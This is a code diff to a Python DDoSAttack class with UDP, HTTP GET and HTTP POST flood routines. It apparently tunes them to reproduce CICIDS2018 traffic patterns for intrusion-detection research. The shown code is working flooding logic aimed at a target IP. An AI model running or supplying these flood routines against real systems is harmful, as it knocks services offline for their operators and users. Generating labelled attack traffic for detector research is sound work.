@@ -56,8 +56,8 @@ class DDoSAttack:
     #   TotLen Fwd Pkts, very low Flow IAT, Protocol=17 (UDP).
     # ──────────────────────────────────────────────────────
     def udp_flood(self):
-        """LOIC-UDP: Flood target with UDP packets at high rate.
-        VARIATION: Random destination ports to avoid single-flow grouping."""
+        """LOIC-UDP: Flood target with UDP packets - create socket, send 1-3 packets, close.
+        CORRECT CICIDS2018: Burst model with rapid socket opening/closing for high flow rate."""
         end_time = time.time() + self.duration
         udp_ports = [53, 123, 161, 514, 1900, 5353, 19132]
         payload_sizes = [512, 1024, 1400]
@@ -67,8 +67,9 @@ class DDoSAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(1)
                 
-                # EXTREME: Send 500-2000 packets per flow (10x increase from current 50-200)
-                num_packets = random.randint(500, 2000)
+                # CORRECT CICIDS2018: 1-3 packets per burst (not 500+)
+                # High volume comes from MANY socket bursts, not packet reuse
+                num_packets = random.randint(1, 3)
                 port = random.choice(udp_ports)
                 
                 for _ in range(num_packets):
@@ -79,12 +80,15 @@ class DDoSAttack:
                         self._inc_count()
                     except Exception:
                         break
-                    # No delay - maximum UDP flood rate
-                    time.sleep(random.uniform(0.00001, 0.0001))
+                    # Minimal delay between packets within burst
+                    time.sleep(random.uniform(0.001, 0.005))
                 
                 sock.close()
             except Exception:
                 pass
+            
+            # Rapid-fire socket bursts (0.3-0.5s between bursts creates ~2-3 flows/sec)
+            time.sleep(random.uniform(0.3, 0.5))
 
     # ──────────────────────────────────────────────────────
     # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
@@ -108,8 +112,9 @@ class DDoSAttack:
                 attack_port = random.choice(http_ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # INCREASED: 100-300 requests per connection (was 1-5)
-                for _ in range(random.randint(1000, 3000)):
+                # CORRECT CICIDS2018: 1-5 requests per keep-alive connection (NOT 1000+)
+                # High volume comes from MANY concurrent threads, not from requests per connection
+                for _ in range(random.randint(1, 5)):
                     if not self.running or time.time() >= end_time:
                         break
 
@@ -133,8 +138,8 @@ class DDoSAttack:
                         pass
                     sock.settimeout(10)
                     
-                    # No delay - maximum request rate
-                    time.sleep(random.uniform(0.0001, 0.0005))
+                    # Minimal delay between requests within keep-alive
+                    time.sleep(random.uniform(0.01, 0.05))
 
                 sock.close()
             except Exception:
@@ -170,8 +175,9 @@ class DDoSAttack:
                 attack_port = random.choice(http_ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # Send 500-1000 POST requests per connection (10x increase from 50-100)
-                requests_this_conn = random.randint(500, 1000)
+                # CORRECT CICIDS2018: 1-3 POST requests per connection (NOT 500-1000)
+                # Close and reopen for each new connection
+                requests_this_conn = random.randint(1, 3)
                 for _ in range(requests_this_conn):
                     if not self.running or time.time() >= end_time:
                         break
@@ -201,8 +207,8 @@ class DDoSAttack:
                     except socket.timeout:
                         pass
                     
-                    # No delay - maximum request rate
-                    time.sleep(random.uniform(0.0001, 0.0005))
+                    # Minimal delay between requests
+                    time.sleep(random.uniform(0.01, 0.05))
 
                 sock.close()
             except Exception:
